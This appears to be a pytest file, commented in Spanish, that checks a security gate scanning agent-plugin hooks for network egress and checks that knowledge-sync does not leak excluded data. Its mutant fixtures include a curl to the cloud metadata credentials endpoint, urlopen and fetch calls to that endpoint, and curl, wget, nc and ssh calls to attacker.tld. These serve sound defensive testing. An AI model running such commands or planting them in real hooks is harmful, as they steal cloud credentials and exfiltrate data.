    root = _repo_minimo(tmp_path, hooks_json=_hooks_json_con(
        'python3 "${CLAUDE_PLUGIN_ROOT}/agent-kits/shared/knowledge-find.py" --intent relacional'),
        ficheros={"agent-kits/shared/knowledge-find.py": "import os\n"})
    assert _ofensores_de_flags_de_adaptador(root), "el mutante H6 sobrevive"


def test_mutante_h7_un_hook_que_hace_curl_al_imds_no_pasa_la_puerta(tmp_path):
    """Mutante H7: `hooks.json` con un `curl` al IMDS de nube escrito inline (sin fichero de por
    medio). Con el escaneo anterior: 23 passed."""
    root = _repo_minimo(tmp_path, hooks_json=_hooks_json_con(
        "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"))
    assert _ofensores_de_red(root), "el mutante H7 sobrevive"


def test_mutante_una_cita_por_variable_no_se_descarta_en_silencio(tmp_path):
    """Mutante: el hook compone la ruta de su script con variables (`python3 "$SHARED/${BASE}.py"`),
    que `_RUTA_RE` no ve, y el fichero real hace `urlopen` al IMDS. Con el escaneo anterior los
    cuatro tests de la seccion PASABAN."""
    root = _repo_minimo(tmp_path, hooks_json=_hooks_json_con(
        'SHARED="${CLAUDE_PLUGIN_ROOT}/agent-kits/shared"; BASE=net-probe; python3 "$SHARED/${BASE}.py"'),
        ficheros={"agent-kits/shared/net-probe.py":
                  "import urllib.request\nurllib.request.urlopen('http://169.254.169.254/')\n"})
    alcanzables, sin_resolver = _recorrido_hooks(root)
    assert sin_resolver, "la cita por variable se sigue descartando en silencio"
    assert "net-probe.py" not in str(sorted(alcanzables)), sorted(alcanzables)


def test_mutante_urllib_en_un_hook_del_frontmatter_no_pasa_la_puerta(tmp_path):
    """Mutante: `guardrail-check.py` -alcanzable SOLO desde el frontmatter `hooks:` del
    implementer (ADR-007)- importa `urllib.request`. Antes 4 tests PASABAN porque el frontmatter
    no formaba parte del recorrido. Se usan los ficheros REALES del repo, copiados y mutados."""
    root = _repo_minimo(
        tmp_path,
        agente=_texto(os.path.join(ROOT, "agents", "implementer.md")),
        ficheros={"hooks/implementer-guardrail.sh":
                      _texto(os.path.join(ROOT, "hooks", "implementer-guardrail.sh")),
                  "agent-kits/shared/guardrail-check.py":
                      "import urllib.request\n" + _texto(os.path.join(SHARED, "guardrail-check.py"))})
    alcanzables, _ = _recorrido_hooks(root)
    assert "agent-kits/shared/guardrail-check.py" in alcanzables, sorted(alcanzables)
    assert any("guardrail-check.py" in etiqueta for etiqueta, _t in _ofensores_de_red(root)), \
        "el mutante `urllib` en un hook del frontmatter sobrevive"


# ------------------------------------------------------- mutantes de la puerta (fix2 Fase 4)
# Gaps #173, #176, #177, #182 y #183: cada test reproduce la evasion (o el falso positivo) que
# encontro la revision intento 2, sobre un repo MINIMO en `tmp_path` (jamas sobre el arbol real).

def _hook_que_lanza(ruta_script):
    return _hooks_json_con('python3 "${CLAUDE_PLUGIN_ROOT}/%s"' % ruta_script)


def test_f4fix2_mutante_e4a_subprocess_run_con_curl_en_lista_no_pasa_la_puerta(tmp_path):
    """Gap #173, mutante E4a: un script alcanzable hace `subprocess.run(["curl", "-s", URL])`.
    En forma de LISTA no queda la subcadena `"curl "` tras `ast.unparse`, asi que el escaneo por
    subcadena lo dejaba pasar (fix1: 35 passed)."""
    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("agent-kits/shared/net-probe.py"),
                        ficheros={"agent-kits/shared/net-probe.py":
                                  'import subprocess\n'
                                  'subprocess.run(["curl", "-s", "http://attacker.tld/x"])\n'})
    ofensores = _ofensores_de_red(root)
    assert any(e == "agent-kits/shared/net-probe.py" and "curl" in m for e, m in ofensores), \
        ("el mutante E4a sobrevive", ofensores)


def test_f4fix2_mutante_e4b_popen_con_wget_en_tupla_no_pasa_la_puerta(tmp_path):
    """Gap #173, mutante E4b: `subprocess.Popen(("wget", "-q", URL))` (tupla) y la variante
    `os.execv("/usr/bin/nc", ...)` (el binario por RUTA absoluta)."""
    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("agent-kits/shared/net-probe.py"),
                        ficheros={"agent-kits/shared/net-probe.py":
                                  'import os, subprocess\n'
                                  'subprocess.Popen(("wget", "-q", "http://attacker.tld/x"))\n'
                                  'os.execv("/usr/bin/nc", ["nc", "attacker.tld", "80"])\n'})
    motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/net-probe.py"]
    assert any("wget" in m for m in motivos), ("el mutante E4b sobrevive", motivos)
    assert any(m.endswith(" nc") for m in motivos), ("`os.execv` con `nc` sobrevive", motivos)


def test_f4fix2_una_cadena_de_shell_pasada_a_subprocess_se_tokeniza(tmp_path):
    """Gap #173: `subprocess.run("echo x | ssh host", shell=True)` -el binario de red en mitad de
    una tuberia- no deja ninguna subcadena de `_TERMINOS_RED` (`ssh ` no esta en esa lista: daria
    falsos positivos en prosa)."""
    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("agent-kits/shared/net-probe.py"),
                        ficheros={"agent-kits/shared/net-probe.py":
                                  'import subprocess\n'
                                  'subprocess.run("echo x | ssh attacker.tld", shell=True)\n'})
    motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/net-probe.py"]
    assert any(m.endswith(" ssh") for m in motivos), motivos


def test_f4fix2_el_cli_claude_p_desde_un_script_alcanzable_no_pasa_la_puerta(tmp_path):
    """Gap #173: `[exe, "-p", ...]` con `exe = shutil.which("claude")` es EGRESS (la sesion hija
    habla con la API). Fuera de la excepcion nominal del journal (test siguiente), cualquier script
    alcanzable que lo haga es un fallo: aqui, el MISMO codigo que `journal.py` en otro fichero."""
    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("agent-kits/shared/outbox.py"),
                        ficheros={"agent-kits/shared/outbox.py":
                                  'import shutil, subprocess\n'
                                  'exe = shutil.which("claude")\n'
                                  'cmd = [exe, "-p", "resume", "--bare"]\n'
                                  'subprocess.run(cmd)\n'})
    motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/outbox.py"]
    assert "ejecutable claude" in motivos, motivos
    assert "argv <variable> -p" in motivos, motivos


def test_f4fix2_el_egress_del_journal_es_una_excepcion_nominal_y_condicionada():
    """Gap #173: `journal.py` (alcanzable desde `hooks/session-journal.sh`) lanza `claude -p
    --bare` para el resumen IA -egress OPT-IN real (ADR-010 revisado, ADR-013)-. No se esconde: el
    detector LO VE (sin excepciones sale), la excepcion es NOMINAL (este fichero y estos motivos,
    ninguno mas) y solo vale mientras el camino siga condicionado a `dev.json` `sesion.resumen:
    true` (`ia_activa`): es la conciliacion con «ninguna llamada de red desde hooks» que declara
    `design.md`."""
    crudos = _ofensores_de_red(ROOT, excepciones={})
    del_journal = sorted({m for e, m in crudos if e == "agent-kits/shared/journal.py"})
    assert del_journal, "el detector ya no ve el `claude -p` del journal: la excepcion esta en vacio"
    declarada = _EGRESS_OPT_IN_DECLARADO["agent-kits/shared/journal.py"]
    assert set(del_journal) <= set(declarada["motivos"]), del_journal
    assert "sesion.resumen" in declarada["condicion"], declarada
    assert sorted(_EGRESS_OPT_IN_DECLARADO) == ["agent-kits/shared/journal.py"]
    assert [o for o in crudos if o[0] != "agent-kits/shared/journal.py"] == [], crudos
    real = _texto(os.path.join(SHARED, "journal.py"))
    assert _egress_del_journal_sin_condicion(real) == [], _egress_del_journal_sin_condicion(real)


def test_f4fix2_mutante_journal_sin_la_condicion_sesion_resumen_rompe_la_excepcion():
    """Mutante del gap #173: la llamada a `resumen_ia` deja de depender de `ia_activa(root)`, o
    `ia_activa` deja de exigir `is True`. La excepcion nominal ya no se sostiene y la puerta lo
    dice (sobre el TEXTO mutado; el arbol real no se toca)."""
    real = _texto(os.path.join(SHARED, "journal.py"))
    sin_guardia = real.replace('ia == "auto" and ia_activa(root)', 'ia == "auto"')
    assert sin_guardia != real, "cambio la guardia de `escribir_sesion`: el mutante ya no aplica"
    assert _egress_del_journal_sin_condicion(sin_guardia), "el mutante sin guardia sobrevive"
    laxa = real.replace('get("resumen") is True', 'get("resumen")')
    assert laxa != real, "cambio `ia_activa`: el mutante ya no aplica"
    assert _egress_del_journal_sin_condicion(laxa), "el mutante `ia_activa` laxa sobrevive"


def test_f4fix2_una_copia_del_journal_sin_guardia_pierde_la_excepcion(tmp_path):
    """Gap #173, sobre una COPIA del repo: el `journal.py` REAL, alcanzable desde un hook, pasa la
    puerta; el mismo fichero con la llamada a `resumen_ia` sin la guardia `ia_activa(root)` ya no
    (la excepcion nominal exige su condicion, no solo el nombre del fichero). Ademas, ningun hook
    fuerza el camino con `--ia on`."""
    real = _texto(os.path.join(SHARED, "journal.py"))
    hook = _hook_que_lanza("agent-kits/shared/journal.py")
    for clave, texto, esperado in (
            ("real", real, False),
            ("sin-guardia", real.replace('ia == "auto" and ia_activa(root)', 'ia == "auto"'), True)):
        root = _repo_minimo(tmp_path / clave, hooks_json=hook,
                            ficheros={"agent-kits/shared/journal.py": texto,
                                      "agent-kits/shared/redact.py": "import re" + chr(10)})
        motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/journal.py"]
        assert bool([m for m in motivos if "claude" in m or "-p" in m]) is esperado, (clave, motivos)
    # nominal por FICHERO: el mismo codigo, guardia incluida, con otro nombre, no esta exento
    root = _repo_minimo(tmp_path / "otro-nombre", hooks_json=_hook_que_lanza("agent-kits/shared/outbox.py"),
                        ficheros={"agent-kits/shared/outbox.py": real,
                                  "agent-kits/shared/redact.py": "import re" + chr(10)})
    motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/outbox.py"]
    assert "ejecutable claude" in motivos, motivos
    for etiqueta, texto, _ruta in _fuentes_ejecutables():
        assert not re.search(r"journal[.]py[^" + chr(10) + r"]*--ia[ =]+on", texto), etiqueta


def test_f4fix2_mutante_e7_import_dinamico_de_socket_no_pasa_la_puerta(tmp_path):
    """Gap #176, mutantes E7a/E7b: `__import__("socket")` (literal: es un import) e
    `importlib.import_module("sock" + "et")` (no literal: FALLO, no se puede verificar)."""
    for clave, codigo, esperado in (
            ("e7a", '__import__("socket").create_connection\n', "import socket"),
            ("e7b", 'import importlib\nimportlib.import_module("sock" + "et")\n', "no literal")):
        root = _repo_minimo(tmp_path / clave,
                            hooks_json=_hook_que_lanza("agent-kits/shared/net-probe.py"),
                            ficheros={"agent-kits/shared/net-probe.py": codigo})
        motivos = [m for e, m in _ofensores_de_red(root) if e == "agent-kits/shared/net-probe.py"]
        assert any(esperado in m for m in motivos), (clave, motivos)


def test_f4fix2_import_module_literal_de_un_modulo_inocuo_no_es_ofensor(tmp_path):
    """Control negativo del #176: un `import_module("json")` literal es un import mas."""
    root = _repo_minimo(tmp_path, hooks_json=_hook_que_lanza("agent-kits/shared/ok.py"),
                        ficheros={"agent-kits/shared/ok.py":
                                  'import importlib\nimportlib.import_module("json")\n'})
    assert _ofensores_de_red(root) == [], _ofensores_de_red(root)


def test_f4fix2_mutante_e8_un_hook_que_lanza_javascript_no_pasa_la_puerta(tmp_path):
    """Gap #177, mutante E8: `node "…/hooks/exfil.js"` (con `fetch` al IMDS dentro) no se
    recorria NI contaba como cita sin resolver. Toda cita a un ejecutable que la puerta no sabe
    escanear (`.js`/`.mjs`/`.ps1`/`.cmd`) es FALLO salvo lista blanca nominal (vacia)."""
    for script in ("hooks/exfil.js", "hooks/exfil.mjs", "hooks/exfil.ps1", "hooks/exfil.cmd"):
        root = _repo_minimo(tmp_path / script.rsplit(".", 1)[1],
                            hooks_json=_hooks_json_con('node "${CLAUDE_PLUGIN_ROOT}/%s"' % script),
                            ficheros={script: "fetch('http://169.254.169.254/latest/meta-data/')\n"})
        _alcanzables, sin_resolver = _recorrido_hooks(root)
        assert any(script.rsplit("/", 1)[1] in c for _o, c in sin_resolver), (script, sin_resolver)
    assert _EJECUTABLES_NO_ESCANEABLES_PERMITIDOS == ()


def test_f4fix2_mutante_e8_un_script_alcanzable_que_cita_javascript_no_pasa(tmp_path):
    """Gap #177, forma transitiva de E8: el hook es un `.sh` inocente que lanza un `.js`."""
    root = _repo_minimo(tmp_path, hooks_json=_hooks_json_con(
        'bash "${CLAUDE_PLUGIN_ROOT}/hooks/ok.sh"'),
        ficheros={"hooks/ok.sh": 'node "$(dirname "$0")/exfil.js"\n',
                  "hooks/exfil.js": "fetch('http://169.254.169.254/')\n"})
    _alcanzables, sin_resolver = _recorrido_hooks(root)
    assert any("exfil.js" in c for _o, c in sin_resolver), sin_resolver


def test_f4fix2_mutante_p5_una_cita_a_ruta_inexistente_no_resuelve_por_nombre(tmp_path):
    """Gap #182, probe P5: `agent-kits/implementer/tools/journal.py` NO existe; antes «resolvia»
    al `journal.py` de `agent-kits/shared/` por BASENAME y el escaneo leia el fichero equivocado
    (9 passed). Ahora es una cita sin resolver."""
    root = _repo_minimo(tmp_path,
                        hooks_json=_hook_que_lanza("agent-kits/implementer/tools/journal.py"),
                        ficheros={"agent-kits/shared/journal.py": "import os\n"})
    alcanzables, sin_resolver = _recorrido_hooks(root)
    assert "agent-kits/shared/journal.py" not in alcanzables, sorted(alcanzables)
    assert any("implementer/tools/journal.py" in c for _o, c in sin_resolver), sin_resolver


def test_f4fix2_las_citas_por_nombre_del_repo_estan_declaradas_una_a_una():
    """Gap #182: sin fallback por basename, las pocas citas del repo que nombran un script SIN
    ruta (`os.path.join(shared, "knowledge-find.py")` dentro del heredoc de `session-context.sh`)
    se resuelven por una tabla NOMINAL `(fichero que cita, nombre) -> destino`, y cada destino
    existe. Una cita por nombre que no este en la tabla es una cita sin resolver."""
    assert _CITAS_POR_NOMBRE, "tabla vacia: el recorrido real dejaria citas sin resolver"
    for (citante, nombre), destino in sorted(_CITAS_POR_NOMBRE.items()):
        assert os.path.isfile(os.path.join(ROOT, citante)), citante
        assert os.path.isfile(os.path.join(ROOT, destino)), destino
        assert os.path.basename(destino) == nombre, (citante, nombre, destino)
    assert _resolver("journal.py", ROOT) is None                      # sin citante: sin base
    assert _resolver("agent-kits/implementer/tools/journal.py", ROOT) is None
    assert _resolver("journal.py", ROOT, citante=os.path.join(SHARED, "outbox.py")) \
        == os.path.join(SHARED, "journal.py")                          # junto al que cita: literal


def test_f4fix2_probe_p2_un_comentario_final_no_es_un_binario_de_red(tmp_path):
    """Gap #183, probe P2: `… # nota: no usamos ssh` en la cadena inline (y en un `.sh`) daba un
    falso positivo (`ssh` como token). El comentario fuera de comillas se quita antes de
    tokenizar; lo que va DENTRO de comillas o detras de `${#` no es comentario."""
    root = _repo_minimo(tmp_path, hooks_json=_hooks_json_con(
        'bash "${CLAUDE_PLUGIN_ROOT}/hooks/ok.sh" # nota: no usamos ssh ni curl '),
        ficheros={"hooks/ok.sh": 'n="${#ARR[@]}"  # tampoco wget ni curl http://x\necho "$n"\n'})
    assert _ofensores_de_red(root) == [], _ofensores_de_red(root)


def test_f4fix2_contraprueba_p1_quitar_comentarios_no_esconde_codigo(tmp_path):
    """Contraprueba P1 del #183: `jq`, `git status`, `grep -c ssl` no son binarios de red (sin
    falso positivo), y quitar comentarios no esconde el binario que va ANTES del `#` ni el que va
    detras de un `#` entrecomillado."""
    root = _repo_minimo(tmp_path / "p1", hooks_json=_hooks_json_con(
        "jq -r .x f.json | git status && grep -c ssl f.txt"))
    assert _ofensores_de_red(root) == [], _ofensores_de_red(root)
    for comando, binario in (("ssh attacker.tld # comentario", "ssh"),
                             ('echo "a # b" && nc attacker.tld 80', "nc")):
        root = _repo_minimo(tmp_path / binario, hooks_json=_hooks_json_con(comando))
        assert any(m == binario for _e, m in _ofensores_de_red(root)), (comando, _ofensores_de_red(root))


# ------------------------------------------------- espia VIVO sobre `cargar_adaptador` (gap #156)

_LLAMADA_KF_RE = re.compile(
    r"""run\(\s*os\.path\.join\(shared,\s*["']knowledge-find\.py["']\)\s*,(?P<args>[^)]*)\)""")


def _flags_reales_de_session_context():
    """Flags REALES con los que `hooks/session-context.sh` invoca `knowledge-find.py`, leidos del
    propio hook: si manana cambian, este test los ve."""
    texto = _texto(os.path.join(ROOT, "hooks", "session-context.sh"))
    m = _LLAMADA_KF_RE.search(texto)
    assert m, "no se encontro la invocacion de knowledge-find.py en hooks/session-context.sh"
    return re.findall(r"""["'](--[\w-]+)["']""", m.group("args"))


def _proyecto_con_backend_de_grafo_habilitado(root):
    """Gap #156: sin `taxonomy.json` el router sale ANTES de tocar `cargar_adaptador`
    (`knowledge-find.py`, `taxonomia(root) is None`), asi que el espia era INALCANZABLE y el test
    pasaba en vacio. Aqui el proyecto declara un backend de grafo habilitado en lectura y con el
    intent en `router.intents`: el unico motivo para que el espia no salte es el argv."""
    _escribir(os.path.join(root, "docs", "knowledge", "README.md"), "# Memoria tecnica\n")
    taxonomia = {
        "version": 1,
        "categories": [{"key": "DECISION", "folder": "adr", "min_evidence": "observation"}],
        "evidence_levels": ["observation", "single_case", "validated_case",
                            "multiple_validated_cases", "human_confirmed_rule"],
        "backends": {"graphiti": {"type": "graphiti", "enabled": True, "config": {
            "mode": "read", "group_id": "proy-seguridad", "endpoint": "http://127.0.0.1:8001/mcp",
            "allow_remote": False, "timeout_ms": 2000,
            "router": {"intents": {"relacional": True}}}}},
    }
    _escribir(os.path.join(root, ".claude", "knowledge-services", "taxonomy.json"),
              json.dumps(taxonomia, ensure_ascii=False))


def _espia_de_carga_de_adaptador(monkeypatch):
    """Espia VIVO sobre `cargar_adaptador` (el unico camino del nucleo hacia un modulo con red):
    registra el intento y levanta, asi que ningun adaptador real llega a cargarse (cero red)."""
    binit = _cargar(os.path.join(KS_BACKENDS, "__init__.py"), "binit_espia_seguridad")
    cargas = []

    def _espia(tipo, *a, **k):
        cargas.append(tipo)
        raise RuntimeError("espia: aqui se habria cargado un adaptador con capacidad de red")

    monkeypatch.setattr(binit, "cargar_adaptador", _espia)
    monkeypatch.setattr(kf, "_cargar_modulo", lambda *a, **k: binit)
    return cargas


def _argv_del_hook(flags, root):
    valores = {"--root": root, "--limit": "0",
               "--contexto": "Checklist de Tareas - Memoria Graphiti",
               "--iniciativa": "graphiti-memory"}
    argv = []
    for flag in flags:
        argv.append(flag)
        if flag in valores:
            argv.append(valores[flag])
    return argv


def test_el_espia_de_adaptadores_si_salta_cuando_se_pasa_intent(tmp_path, monkeypatch, capsys):
    """CONTROL POSITIVO del gap #156: con el MISMO proyecto y el MISMO espia, añadir `--intent
    relacional` SI llega a `cargar_adaptador`. Sin este control el test de abajo no demuestra
    nada: podria estar pasando porque el camino esta muerto (que es lo que pasaba)."""
    root = str(tmp_path)
    _proyecto_con_backend_de_grafo_habilitado(root)
    cargas = _espia_de_carga_de_adaptador(monkeypatch)
    assert kf.main(_argv_del_hook(_flags_reales_de_session_context(), root)
                   + ["--intent", "relacional"]) == 0
    capsys.readouterr()
    assert cargas == ["graphiti"], cargas


def test_el_argv_real_del_hook_no_carga_ningun_adaptador(tmp_path, monkeypatch, capsys):
    """Con el argv EXACTO del hook -y un proyecto donde el backend de grafo SI esta habilitado y
    enrutado (control positivo arriba)-, `knowledge-find.py` no llega a `cargar_adaptador`."""
    flags = _flags_reales_de_session_context()
    assert flags, "el hook ya no pasa ningun flag a knowledge-find.py"
    assert "--intent" not in flags and "--backends-dir" not in flags, flags

    root = str(tmp_path)
    _proyecto_con_backend_de_grafo_habilitado(root)
    cargas = _espia_de_carga_de_adaptador(monkeypatch)
    assert kf.main(_argv_del_hook(flags, root)) == 0
    assert cargas == [], cargas
    assert "aciertos" in json.loads(capsys.readouterr().out)



# ============================================ 2. ningun dato excluido llega al grafo (CA-01/CA-07)

MARCA_JOURNAL = "TEXTO-EXCLUIDO-JOURNAL-no-debe-viajar"
MARCA_CANDIDATA = "TEXTO-EXCLUIDO-CANDIDATA-no-debe-viajar"
MARCA_LOG = "TEXTO-EXCLUIDO-LOG-de-prompts-no-debe-viajar"
MARCA_PROMPT = "TEXTO-EXCLUIDO-FICHERO-PROMPT-no-debe-viajar"
MARCA_SIN_ROUTING = "CUERPO-SIN-ROUTING-no-debe-viajar"
MARCA_ROUTING_FALSE = "CUERPO-ROUTING-FALSE-no-debe-viajar"
MARCA_ENRUTADA = "CUERPO-ENRUTADO-si-viaja"

_MARCAS_EXCLUIDAS = (MARCA_JOURNAL, MARCA_CANDIDATA, MARCA_LOG, MARCA_PROMPT,
                     MARCA_SIN_ROUTING, MARCA_ROUTING_FALSE)


def _escribir(ruta, texto):
    os.makedirs(os.path.dirname(ruta), exist_ok=True)
    with open(ruta, "w", encoding="utf-8") as f:
        f.write(texto)


def _entrada_md(root, folder, fichero, id_, category, cuerpo, version=1, estado="aprobado"):
    _escribir(os.path.join(root, "docs", "knowledge", "approved", folder, fichero),
              "---\nid: %s\nversion: %s\nestado: %s\ncategory: %s\nevidencia: observation\n"
              "fuentes:\n  - docs/x.md\ntags:\n  - clave:valor\n---\n\n%s\n"
              % (id_, version, estado, category, cuerpo))


def _taxonomia_graphiti(root, endpoint, provider=None, extra_config=None, tipo="graphiti"):
    """Taxonomia con UN backend `graphiti` habilitado y tres categorias: enrutada, sin `routing`
    declarado y `routing.graphiti: false` (CA-07, fail-closed)."""
    config = {
        "llm": "ollama", "model": "qwen2.5:7b", "base_url": "http://127.0.0.1:11434/v1",
    } if provider is None else provider
    cfg_backend = {
        "mode": "shadow", "endpoint": endpoint, "group_id": "proy-seguridad",
        "allow_remote": False, "timeout_ms": 2000, "provider": config,
    }
    cfg_backend.update(extra_config or {})
    taxonomia = {
        "version": 1,
        "id_prefix": "ks",
        "categories": [
            {"key": "ENRUTADA", "folder": "gotchas", "min_evidence": "observation",
             "routing": {"graphiti": True}},
            {"key": "SIN_ROUTING", "folder": "lessons", "min_evidence": "observation"},
            {"key": "DESACTIVADA", "folder": "adr", "min_evidence": "observation",
             "routing": {"graphiti": False}},
        ],
        "evidence_levels": ["observation", "single_case", "validated_case",
                            "multiple_validated_cases", "human_confirmed_rule"],
        "backends": {"graphiti": {"type": tipo, "enabled": True, "config": cfg_backend}},
    }
    _escribir(os.path.join(root, ".claude", "knowledge-services", "taxonomy.json"),
              json.dumps(taxonomia, ensure_ascii=False))
    return taxonomia


def _proyecto_con_datos_excluidos(root, endpoint, **kwargs):
    """`approved/` con las tres categorias + ficheros FUERA de `approved/` que la spec declara
    fuera de alcance (journal, candidates, un `.log` de prompts y un fichero con `prompt` en el
    nombre): nada de eso puede llegar al grafo."""
    _taxonomia_graphiti(root, endpoint, **kwargs)
    _entrada_md(root, "gotchas", "GOT-001.md", "got-1", "ENRUTADA", MARCA_ENRUTADA)
    _entrada_md(root, "lessons", "LES-001.md", "les-1", "SIN_ROUTING", MARCA_SIN_ROUTING)
    _entrada_md(root, "adr", "ADR-001.md", "adr-1", "DESACTIVADA", MARCA_ROUTING_FALSE)
    _escribir(os.path.join(root, "docs", "knowledge", "journal", "2026-09-22-sesion.md"),
              "# Journal\n\n" + MARCA_JOURNAL + "\n")
    _escribir(os.path.join(root, "docs", "knowledge", "candidates", "pending", "cand-1.md"),
              "---\nid: cand-1\n---\n\n" + MARCA_CANDIDATA + "\n")
    _escribir(os.path.join(root, ".claude", "session-prompts-abc123.log"),
              MARCA_LOG + "\n")
    _escribir(os.path.join(root, "docs", "knowledge", "journal", "prompt-2026-09-22.md"),
              MARCA_PROMPT + "\n")


def _add_memory(llamadas):
    return [args for nombre, args in llamadas if nombre == "add_memory"]


def test_solo_las_entradas_aprobadas_y_enrutadas_generan_episodios(tmp_path, capsys):
    """CA-01 + CA-07: una categoria sin `routing.graphiti: true` NUNCA genera episodios, y lo que
    vive fuera de `approved/` no existe para el sincronizador."""
    root = str(tmp_path)
    with ServidorMCP() as srv:
        _proyecto_con_datos_excluidos(root, srv.endpoint)
        codigo = ks_sync.main(["--backend", "graphiti", "--root", root, "--json"])
        llamadas = list(srv.llamadas)
    salida = capsys.readouterr()
    assert codigo == 0, salida.err
    episodios = _add_memory(llamadas)
    assert len(episodios) == 1, [e.get("name") for e in episodios]
    assert episodios[0]["name"].startswith("got-1@")
    assert episodios[0]["group_id"] == "proy-seguridad"
    # las omitidas por routing se DICEN (no se silencian), pero no viajan
    assert "omitida(s) por routing" in salida.err


def test_ningun_episodio_lleva_texto_de_lo_excluido(tmp_path, capsys):
    """El `episode_body` (y cualquier otro argumento de cualquier tool) no puede contener texto de
    las entradas no enrutadas ni de los ficheros fuera de `approved/`."""
    root = str(tmp_path)
    with ServidorMCP() as srv:
        _proyecto_con_datos_excluidos(root, srv.endpoint)
        assert ks_sync.main(["--backend", "graphiti", "--root", root, "--json"]) == 0
        llamadas = list(srv.llamadas)
    capsys.readouterr()
    crudo = json.dumps(llamadas, ensure_ascii=False)
    for marca in _MARCAS_EXCLUIDAS:
        assert marca not in crudo, marca
    assert MARCA_ENRUTADA in crudo               # y lo que SI esta enrutado, viaja


# ================================ 3. CA-14 (ollama invalido -> dead-letter) y CA-04 (degradacion)

# Salida estructurada INVALIDA de Ollama, en sus dos formas reales: (a) el proveedor devuelve una
# estructura que no cumple el contrato de `add_memory`, y (b) el servidor rechaza la llamada porque
# el modelo local devolvio un JSON roto (`structured_output_mode: json_object`).
_ERROR_OLLAMA_JSON_ROTO = {
    "isError": True,
    "content": [{"type": "text", "text": "ollama structured output invalid: "
                                          "json.decoder.JSONDecodeError: Expecting ',' delimiter"}],
}


def _dead_letter(dir_outbox):
    """Contenido de `dead-letter/` (la carpeta no existe hasta que `outbox.py` la crea)."""
    try:
        return sorted(os.listdir(os.path.join(dir_outbox, "dead-letter")))
    except FileNotFoundError:
        return []


def _proveedor_ollama_roto(_config, _episodio):
    """Fixture: el proveedor `ollama` devuelve una salida estructurada que NO es un episodio
    valido (esquema incorrecto: sin `name`/`group_id`)."""
    return {"episode_body": "{\"entities\": [", "modelo": "qwen2.5:7b"}


def test_ca14_un_doble_de_proveedor_con_estructura_invalida_no_llega_a_add_memory(tmp_path,
                                                                                  monkeypatch):
    """CA-14, primera forma: una salida estructurada invalida hace fallar la op ANTES de gastar la
    llamada de red — el grafo no ve nada y el manifiesto PUBLICADO no se toca (no hay datos
    corruptos).

    Gap #154 (Important, fix1 Fase 4): este test inyecta un DOBLE en la entrada `ollama` de
    `PROVEEDORES` (el proveedor real de `ollama` no se ejerce aqui; el titulo anterior lo vendia
    como si si). Al proveedor REAL, mutado en una copia del modulo, lo ejerce
    `test_ca14_el_proveedor_real_que_pierde_el_uuid_...`, justo debajo."""
    root = str(tmp_path)
    with ServidorMCP() as srv:
        monkeypatch.setitem(gr._gp.PROVEEDORES, "ollama", _proveedor_ollama_roto)
        cfg = {"_root": root, "group_id": "proy-seguridad", "endpoint": srv.endpoint,
               "allow_remote": False, "timeout_ms": 2000,
               "provider": {"llm": "ollama", "model": "qwen2.5:7b"}}
        ops = gr.plan([_apoyo_mcp._entrada()], cfg)
        assert ops, "sin operaciones no habria nada que probar"
        fallo = None
        try:
            gr.apply(ops, cfg)
        except gr.ErrorMCP as e:
            fallo = e
        # lo PRIMERO: ni una llamada de red con datos incompletos (el grafo no ve nada)
        assert _add_memory(srv.llamadas) == []
        assert fallo is not None, "apply() debia fallar con una salida estructurada invalida"
        assert "estructura invalida" in str(fallo)
    assert not os.path.isfile(gr._manifest_path(cfg))


def test_ca14_ollama_invalido_acaba_en_dead_letter_sin_tocar_el_manifiesto(tmp_path, capsys):
    """CA-14 de punta a punta por `knowledge-sync`: el servidor rechaza `add_memory` porque el
    modelo local devolvio un JSON roto. El envelope se reintenta (nunca se pierde al primer golpe)
    y acaba en `dead-letter/` con la causa REAL; el manifiesto publicado no llega a existir y el
    CLI sale con 1 y mensaje, sin traceback."""
    root = str(tmp_path)
    dir_outbox = os.path.join(root, ".claude", "knowledge-services", "_sync-outbox", "graphiti")
    manifiesto = os.path.join(root, ".claude", "knowledge-services", "graphiti-manifest.json")
    with ServidorMCP(respuestas_tools={"add_memory": _ERROR_OLLAMA_JSON_ROTO}) as srv:
        _proyecto_con_datos_excluidos(root, srv.endpoint)

        codigo = ks_sync.main(["--backend", "graphiti", "--root", root, "--json"])
        err = capsys.readouterr().err
        assert codigo == 1
        assert "apply()" in err and "publicación anterior intacta" in err
        assert "envelope: reencolado" in err          # nunca dead-letter al primer fallo
        assert _dead_letter(dir_outbox) == []

        for _ in range(2):                            # intentos 2 y 3 -> MAX_INTENTOS
            ob.reintentar_ahora(dir_outbox)           # sin esperar el backoff real
            ks_sync.main(["--backend", "graphiti", "--root", root, "--json"])
            capsys.readouterr()

    muertos = _dead_letter(dir_outbox)
    causa_json = next((n for n in muertos if n.endswith(".causa.json")), None)
    assert causa_json, ("el envelope fallido nunca llego a dead-letter", muertos)
    with open(os.path.join(dir_outbox, "dead-letter", causa_json), encoding="utf-8") as f:
        causa = json.load(f)
    assert causa["intentos"] >= 3
    assert "isError" in causa["causa"] and "ollama" in causa["causa"].lower()
    # nada corrupto: no hay publicacion, ni manifiesto pendiente huerfano con datos del fallo
    assert not os.path.isfile(manifiesto)


def test_ca04_endpoint_apagado_degrada_sin_bloquear(tmp_path, capsys):
    """CA-04: con el endpoint apagado, `health` da error/off CON detalle, `puede_leer` es false con
    razon, y `--check` sale con 1 sin traceback (el ciclo sigue: nadie lanza)."""
    root = str(tmp_path)
    apagado = "http://127.0.0.1:1"
    cfg = {"_root": root, "group_id": "proy-seguridad", "endpoint": apagado, "mode": "read",
           "allow_remote": False, "timeout_ms": 300, "provider": {"llm": "ollama", "model": "m"}}
    salud = gr.health(cfg)
    assert salud["estado"] in ("off", "error", "degradado"), salud
    assert salud.get("detalle"), salud
    lectura = gr.puede_leer(cfg)
    assert lectura["puede"] is False and lectura["razon"]

    _proyecto_con_datos_excluidos(root, apagado)
    codigo = ks_sync.main(["--backend", "graphiti", "--root", root, "--check", "--json"])
    salida = capsys.readouterr()
    assert codigo == 1
    assert "Traceback" not in salida.err and "Traceback" not in salida.out


